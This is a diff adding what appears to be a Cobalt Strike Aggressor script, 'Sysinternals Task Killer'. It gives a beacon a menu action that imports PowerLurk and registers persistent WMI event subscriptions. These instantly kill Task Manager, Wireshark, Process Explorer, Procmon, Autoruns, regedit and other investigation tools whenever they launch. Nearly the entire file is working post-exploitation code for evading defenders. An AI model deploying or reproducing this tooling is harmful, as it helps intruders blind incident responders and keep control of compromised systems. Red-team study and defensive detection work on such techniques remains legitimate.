@@ -1,0 +1,50 @@
+# Sysinternals Task Killer
+#author: bluescreenofjeff
+
+# Automatically kill common Blue Team processes, such as the Sysinternals tools, on launch.
+
+#Based on command demonstrated by Andrew Luke in his post:
+#Creeping on Users with WMI Events: Introducing PowerLurk - https://pentestarmoury.com/2016/07/13/151/
+
+#Save powerlurk.ps1 to the same directory you load this script from
+
+sub sysinternalkiller {
+	
+	if (-exists script_resource("powerlurk.ps1")) {
+		$path = script_resource("powerlurk.ps1");
+		return $path;
+	}
+	else {
+		prompt_file_open("Select the PowerLurk.ps1 file on your system", $null, false, {
+			$path = $1;
+			return $path;
+		});
+	}
+	bpowershell_import($1, $path);
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc1 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName taskmgr.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc2 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName wireshark.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc3 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName tcpview.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc4 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procdump.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc5 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procexp.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc6 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procmon.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc7 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName netstat.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc8 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName psloggedon.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc9 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName logonsessions.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc10 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName processhacker.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc11 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName autoruns.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc12 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName autorunsc.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc13 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName regedit.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc14 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName regshot.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc15 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName procexp64.exe');
+	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc16 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName tcpview.exe');
+}
+
+
+popup beacon_bottom {
+	item "Sysinternal Killer" {
+		local('$bid');
+		foreach $bid ($1) {
+			sysinternalkiller($bid);
+		}
+	}
+}
